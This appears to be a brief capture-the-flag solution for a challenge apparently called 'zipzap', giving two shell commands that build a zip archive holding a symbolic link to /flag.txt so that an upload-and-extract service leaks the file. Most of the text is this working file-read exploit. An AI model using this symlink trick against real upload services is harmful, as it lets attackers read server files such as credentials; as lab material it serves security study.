inject a symbolic link to `flag.txt` in the `zipzap` directory, then compress it as a zip and upload. The flag will be in the zip file.

```bash 
ln -s /flag.txt flag
zip --symlinks  zipzap.zip flag
```

